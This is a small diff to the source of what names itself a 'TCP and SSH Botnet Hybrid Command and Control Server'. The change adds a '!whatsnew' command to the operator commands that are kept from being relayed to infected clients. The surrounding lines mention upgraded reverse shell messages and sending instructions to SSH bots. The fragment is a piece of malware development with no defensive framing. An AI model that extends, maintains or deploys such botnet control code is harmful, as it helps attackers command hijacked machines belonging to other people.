@@ -887,7 +887,7 @@ TCP and SSH Botnet Hybrid Command and Control Server By DrSquid"""
 [+] - Upgraded reverse shell messages.
 [+] - Made it so that '!clear', '!genscript' and '!genadminscript' are not sent to the clients.
                     """)
-                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip():
+                if "!clear" in self.instruction.strip() or "!genscript" in self.instruction.strip() or "!genadminscript".strip() in self.instruction.strip() or "!whatsnew" in self.instruction.strip():
                     pass
                 else:
                     if len(self.ssh_bots) != 0:
